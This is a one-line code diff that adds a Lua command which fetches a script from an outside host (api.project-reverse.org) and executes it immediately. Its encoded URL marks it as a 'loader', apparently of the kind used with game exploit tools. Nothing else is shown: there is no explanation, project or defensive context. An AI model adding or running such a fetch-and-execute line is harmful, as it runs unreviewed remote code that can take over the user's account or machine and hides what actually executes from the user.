@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImYzNjMxODViLWMwOTctNDlkMS1hNzQyLWI4OTliZTQyYTg2ZSIsImtpbmQiOiJsb2FkZXIifQ"))()
